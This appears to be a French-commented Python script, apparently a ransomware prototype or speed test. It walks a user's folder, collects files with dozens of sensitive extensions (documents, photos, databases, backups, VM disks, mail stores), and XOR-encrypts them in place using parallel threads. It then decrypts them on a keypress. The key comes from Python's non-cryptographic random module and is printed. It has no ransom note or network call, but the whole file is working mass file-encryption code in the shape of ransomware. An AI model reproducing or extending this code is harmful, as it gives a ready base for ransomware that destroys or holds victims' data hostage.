import os
import random
import threading
import time

key = ''
list_of_files = []

# Extensions de fichiers ciblés pour le chiffrement
sensitive_extensions = [
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.odt', '.ods', '.odp', '.pdf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.raw', '.cr2', '.nef', '.arw',
    '.mp4', '.avi', '.mov', '.mkv', '.wmv',
    '.mp3', '.wav', '.flac', '.aac', '.ogg',
    '.html', '.css', '.js', '.py', '.java', '.c', '.cpp', '.cs', '.rb', '.php',
    '.sql', '.json', '.xml', '.yml',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.bak', '.iso', '.vhd', '.vmdk',
    '.mdb', '.accdb', '.sqlite', '.db', '.pst', '.ost', '.log', '.cfg', '.ini',
    '.psd', '.ai', '.indd', '.dwg', '.dxf'
]

def get_files():
    """Récupère les fichiers à chiffrer"""
    path = r"C:\Users\pierr\Desktop\Dev - Copie"
    global list_of_files
    for root, dirs, files in os.walk(path):
        for file in files:
            if file.lower().endswith(tuple(sensitive_extensions)):
                full_path = os.path.join(root, file)
                print(f"[FICHIER] {full_path}")
                list_of_files.append(full_path)

def generate_key():
    """Génère une clé de chiffrement aléatoire"""
    global key
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    key = ''.join(random.choice(characters) for _ in range(64))
    print(f"[CLÉ GÉNÉRÉE] Sauvegardez cette clé : {key}")

def encrypt_file(file):
    """Chiffre un fichier avec la clé globale"""
    try:
        key_index = 0
        with open(file, 'rb') as f:
            data = f.read()
        encrypted = bytearray()
        for byte in data:
            encrypted.append(byte ^ ord(key[key_index]))
            key_index = (key_index + 1) % len(key)
        with open(file, 'wb') as f:
            f.write(encrypted)
        print(f"[CHIFFRÉ] : {file}")
    except Exception as e:
        print(f"[ERREUR CHIFFREMENT] : {file} ({e})")

def decrypt_file(file):
    """Déchiffre un fichier avec la clé globale"""
    try:
        key_index = 0
        with open(file, 'rb') as f:
            data = f.read()
        decrypted = bytearray()
        for byte in data:
            decrypted.append(byte ^ ord(key[key_index]))
            key_index = (key_index + 1) % len(key)
        with open(file, 'wb') as f:
            f.write(decrypted)
        print(f"[DÉCHIFFRÉ] : {file}")
    except Exception as e:
        print(f"[ERREUR DÉCHIFFREMENT] : {file} ({e})")

def run_in_threads(task_function):
    """Exécute une fonction sur chaque fichier en parallèle avec des threads"""
    start_time = time.time()
    threads = []
    for file in list_of_files:
        t = threading.Thread(target=task_function, args=(file,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    end_time = time.time()
    print(f"\n[Temps d'éxécution] Temps total : {end_time - start_time} secondes")

def no_thread_encrypt_file():
    start_time = time.time()
    for file in list_of_files:
        try:
            key_index = 0
            with open(file, 'rb') as f:
                data = f.read()
            encrypted = bytearray()
            for byte in data:
                encrypted.append(byte ^ ord(key[key_index]))
                key_index = (key_index + 1) % len(key)
            with open(file, 'wb') as f:
                f.write(encrypted)
            print(f"[CHIFFRÉ] : {file}")
        except Exception as e:
            print(f"[ERREUR CHIFFREMENT] : {file} ({e})")
    end_time = time.time()
    print(f"\n[TEST SÉQUENTIEL] Temps total : {end_time - start_time} secondes")
    
# --- Exécution ---
get_files()
generate_key()
input("Appuyez sur Entrée pour lancer le chiffrement...")
run_in_threads(encrypt_file)
input("Appuyez sur Entrée pour démarrer le déchiffrage...")
run_in_threads(decrypt_file)

